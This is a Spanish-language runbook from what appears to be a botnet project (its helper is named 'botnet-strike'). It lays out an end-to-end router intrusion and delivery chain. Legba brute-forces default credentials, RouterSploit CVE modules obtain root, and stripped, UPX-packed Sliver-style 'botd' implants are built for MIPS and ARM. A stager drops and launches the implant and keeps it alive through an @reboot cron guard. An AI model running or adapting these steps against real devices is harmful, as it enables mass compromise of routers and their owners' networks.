---
artifact: runbook
epic: EP-02
created: 2026-11-14
---

# Runbook — Intrusión y entrega (EP-02)

Flujo completo contra un target: descubrimiento (EP-01) llama a esta puerta.
Todo comando corre en el host de operaciones (Linux o Git Bash); el stager es
el único que viaja al dispositivo.

## 1. legba — credenciales multi-protocolo (T-0201)

```sh
scripts/intrusion/legba_run.sh TARGET=$QEMU_IP            # run real (legba en PATH)
scripts/intrusion/legba_run.sh --protocols                # http ssh telnet ftp (4)
scripts/intrusion/legba_run.sh TARGET=10.70.0.5 \
    --fixture testdata/intrusion/legba_hit.json \
    --banner testdata/intrusion/banner_tlwr841n.txt       # doble sin QEMU
```

- Salida SIEMPRE JSON en stdout: `{protocol, cred_index, model_guess, ok}`.
  Puerta abierta → exit 0; target sano → exit 1 con `protocol: null`.
- Diccionario: `scripts/intrusion/dictionaries/cred-defaults.txt`
  (`user:pass` una por línea). `--dict FILE` para el propio.
- Tope duro: timeout del runner por encima del timeout propio de legba
  (`--timeout`, default 20 s) para cerrar el criterio de < 30 s y no dejar
  procesos colgados. `timeout(1)` se usa si está instalado.
- El parse normalizador vive en `internal/intrusion` (helper
  `botnet-strike legba-parse`); acepta el JSON de legba y el texto plano
  canónico `[SUCCESS] <proto> host:port user:pass`. `model_guess` es un indicio
  desde evidencia de banner (`--banner FILE`), nunca una clasificación dura.
- Banderas de legba esperadas: `--protocols --target --user-file --pass-file
  --timeout --output-format json`; si la distro local difiere, se ajustan en
  `legba_run.sh` (única capa que conoce la herramienta externa).

## 2. RouterSploit por CVE de modelo (T-0202)

```sh
scripts/intrusion/routersploit_run.sh --dry-run MODEL=TL-WR841N   # lookup YAML, <5 s, exit 0
scripts/intrusion/routersploit_run.sh --dry-run MODEL=SinCVE      # exit 3, exploit_id null (ausencia)
scripts/intrusion/routersploit_run.sh MODEL=TL-WR841N TARGET=$QEMU_IP   # run real
```

- Run real: `RSP_CMD` es la plantilla del módulo: se invoca
  `$RSP_CMD <module> <target> <read_cmd>` y su stdout debe traer la evidencia
  del `read_cmd` (grep `uid=`); se registra en `INTRUSION_LOG`
  (default `./intrusion.log`) con ts, modelo, CVE y exploit_id.
- Dobles sin QEMU: `--fixture testdata/intrusion/rs_uid.txt` reproduce una
  captura del módulo (canal de explotación devolviendo `uid=0(root)`).

## 3. YAML de CVEs por modelo (T-0203)

- `scripts/intrusion/cve-models.yaml` es dato versionado: entrada por modelo
  con `model, cve, arch, device_class, exploit_id, module, read_cmd`.
- Validación en CI: `go test ./scripts/intrusion/ -run TestCVEModelSchema`
  (esquema estricto + enums en `internal/intrusion/cve.go`). La equivalencia
  con `yamllint` (yamllint no instalado en esta máquina) la cubre el parser
  YAML estricto: campo desconocido o enum fuera de dominio rompe el build.
- Copia de prueba con `arch: x86`: `testdata/intrusion/cve-models.badarch.yaml`
  — el validador la rechaza (assert de enum), y así se verifica el dominio.

## 4. sliver-builder — binario por perfil (T-0204)

```sh
deploy/sliver-builder/build.sh --arch=mipsle --profile=C    # -> dist/botd-mipsle
bash scripts/cross/matrix.sh                                 # las 6 archs del perfil matriz < 10 min
```

- `CGO_ENABLED=0`, `-trimpath -ldflags "-s -w"` siempre; upx `-9` si el perfil
  lo pide (perfiles en `deploy/sliver-builder/profiles.yaml`: A ≤ 4 MB; B/C
  post-upx ≤ 2.6 MB). Ausencia de `upx` no aborta: se mide contra
  `max_bytes_raw` y se avisa; el post-upx real es la puerta en CI.
- Mapa arch→toolchain: mipsbe=`GOARCH=mips`, mipsle=`mipsle`, armv5=`arm`
  `GOARM=5`, armv7=`arm` `GOARM=7`, arm64, amd64. `file` debe decir
  `ELF 32-bit LSB executable, MIPS, ... statically linked` (nunca
  `dynamically linked`).
- `make cross`: el Makefile del suelo aún no tiene el target (no se edita
  desde esta épica); `scripts/cross/matrix.sh` es lo que invocará
  `cross:` cuando el orquestador lo añada. En esta máquina `make` no está
  instalado y se ejecuta el script directo.

## 5. Stager de entrega (T-0205) y clase C en /tmp (T-0206)

```sh
deploy/sliver-builder/stager.sh --src=dist/botd-mipsle --profile=C \
    --retries=3 --backoff-base-s=2 --jitter-range-s=10 --log=stager.log
```

- Destino: clases A/B → `/data/botd/botd` (persistente, slots A/B); clase C u
  overlay medido < 8 MB → `/tmp/botd` y el log dice `dest=/tmp`. Antes de
  copiar se exige libre ≥ 4 MB en el destino; si no, exit 4 (tope de flash:
  llenar el overlay de un router de 8 MB es matar el nodo).
- Reintentos: copia + verificación sha256; fallo → reintento (tope 3) con
  retardo `base*attempt + jitter` (jitter entero 0..10 s — busybox `sleep` sin
  fracciones; el jitter es lo que evita que la cohorte reconecte en manada tras
  un corte: 5 runs seguidos presentan retardos distintos, medido sobre los
  `delay=` del log). `tc netem loss 5%` se dobla con `--fail-copies=N`.
- Fin: lanza `"$DEST" --stage` en background y el stager muere — `pgrep -c
  stager` = 0 tras finish; no queda residente ni huérfano. En máquinas de
  test sin ELF ejecutable: `--stage-cmd=CMD`.
- Spool contable de clase C: `mkdir -p $DEST_DIR/botd-spool` (en /tmp para C;
  `internal/intrusion.Spool` aplica el tope de 64 KB recortando la cabecera —
  lo viejo ya viajó en flush previos; `TestSpoolCap24h` simula 1440 flushes).
- **Política tmpfs-only documentada (criterio 2):** en clase C el binario y el
  spool viven en tmpfs; sobreviven al uptime pero NO al reboot. Tras reboot,
  la única línea de cron (`@reboot` + guard, BLUEPRINT §4) relanza; si
  `/tmp/botd` no existe, el guard re-copia desde la persistencia declarada
  (`/data/botd/persist/botd` cuando existe, o re-entrega del stager vía
  backend). Nada crítico (claves, `node.json`) vive en /tmp: eso es
  responsabilidad del enroll de EP-03 sobre `/data/botd`.

## 6. Limitaciones verificadas con dobles

| Criterio que exige hardware | Doble usado | Queda pendiente en campo |
|---|---|---|
| QEMU vulnerable (legba/rsp reales) | fixtures `testdata/intrusion/legba_*`, `rs_uid.txt` | tiempos reales de escaneo |
| `tc netem loss 5%` | `--fail-copies=N` + verificación sha256 | pérdida real en la copia |
| overlay 8 MB del QEMU clase C | `--overlay-free-kb=` y `df -k /overlay` | `df` real del firmware |
| `pgrep -c` en el router | ausencia del proceso stager tras exit | `pgrep` real en busybox |
| yamllint | parser YAML estricto + enums (Go) | style rules de yamllint |
| `upx` en la máquina base | instalada para la verificación local (5.3.0) | upx en la imagen del builder CI |
